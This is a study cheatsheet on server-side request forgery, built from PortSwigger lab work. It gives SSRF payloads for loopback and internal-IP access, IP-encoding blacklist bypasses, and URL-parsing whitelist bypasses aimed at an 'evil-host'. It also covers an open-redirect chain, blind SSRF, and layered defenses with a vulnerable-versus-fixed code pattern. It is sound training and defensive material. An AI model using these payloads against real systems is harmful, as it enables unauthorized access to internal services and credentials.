# SSRF Cheatsheet

Quick-recall reference for Server-Side Request Forgery. Built while studying PortSwigger's SSRF topic and solving all labs.

## What it is

Server fetches a URL that the user controls. Attacker doesn't connect to the target directly — the server does it on their behalf, carrying the server's network trust and position.

```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```
Change the value → server requests whatever you put there.

## Impact

- Access internal-only services
- Reach the server itself via loopback
- Leak credentials/sensitive data from internal systems
- In some cases, full remote code execution via back-end systems

---

## 1. SSRF against the server itself

Target the server's own loopback interface.

```
stockApi=http://localhost/admin
stockApi=http://127.0.0.1/admin
```
**Why it works:** admin panels often skip auth for requests from the local machine (dev/disaster-recovery backdoor, or the access-control check sits in a front-end component the loopback request bypasses).

---

## 2. SSRF against another back-end system

Target internal, non-routable IPs that users can't reach directly.

```
stockApi=http://192.168.0.68/admin
```
**Why it works:** back-end systems rely on network isolation as their only defense, so they often have weak/no auth once reached.

---

## 3. Blacklist filter bypass

Filter blocks literal strings like `127.0.0.1` / `localhost`. Bypass by changing the representation, not the target:

```
http://2130706433/admin            # decimal IP
http://017700000001/admin          # octal IP
http://127.1/admin                 # shorthand IP
http://spoofed.burpcollaborator.net/admin   # domain you control, resolves to 127.0.0.1
```
Also try: URL encoding, case variation, or a redirect chain (see #4).

**Lesson:** blacklist checks a spelling, not the address.

---

## 4. Whitelist filter bypass

Filter only allows URLs matching an expected host. Exploit URL-parsing inconsistencies between the filter and the code making the request.

```
https://expected-host:fakepassword@evil-host        # credentials before @, host is evil-host
https://evil-host#expected-host                     # fragment, host is evil-host
https://expected-host.evil-host                     # subdomain trick, host is evil-host
```
Also: URL-encode or double-encode characters so the filter's parser and the request parser disagree.

**Lesson:** checking hostname *text* ≠ checking where the request actually lands. Validate the resolved destination, not the string.

---

## 5. Bypass via open redirect

Allowed domain has an open redirect. Chain it to reach the real (blocked) target.

```
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
Flow: filter approves `weliketoshop.net` → app requests it → that endpoint redirects → app follows redirect → lands on internal target.

**Lesson:** allowlisting a host is useless if that host can redirect elsewhere. Validate every hop, not just the first request.

---

## 6. Blind SSRF

Request is made, but response is never shown back to you.

- Confirm with out-of-band interaction (Burp Collaborator / your own listener)
- Harder to exploit, but can escalate to RCE via vulnerable back-end components
- No visible output ≠ no impact

---

## 7. Hidden attack surface

- **Partial URLs** — only host or path is user-controlled, rest built server-side
- **Data formats (XML)** — parser may fetch external URLs referenced in the document (→ XXE-driven SSRF)
- **Referer header** — analytics software that visits links in Referer

---

## Defenses (strength order)

1. Allowlist of destination hosts (not blacklist)
2. Resolve DNS server-side, reject private/loopback/link-local ranges
3. Validate every redirect hop manually, or disable redirects
4. Pin the validated IP for the actual request (closes DNS-rebinding gap between check and connect)
5. Network-level egress rules on app servers
6. Cloud metadata hardening (e.g. IMDSv2)
7. Log outbound requests, alert on private ranges / `169.254.169.254`

## Minimal vulnerable vs fixed pattern

```python
# vulnerable
url = request.args["url"]
requests.get(url)

# fixed (still needs network-level controls for full defense)
if not is_allowed(url):   # allowlist host + resolve DNS + reject private ranges
    abort(400)
requests.get(url, allow_redirects=False)   # handle redirects manually, re-validate each hop
```

## Labs solved (PortSwigger SSRF)

- [x] Basic SSRF against the local server
- [x] Basic SSRF against another back-end system
- [x] SSRF with blacklist-based input filter
- [x] SSRF with filter bypass via open redirection
- [x] SSRF with whitelist-based input filter (Expert)

## Real-world reference

SSRF reaching cloud metadata was central to the 2019 Capital One breach. OWASP Top 10:2025 folds SSRF into Broken Access Control (A01).
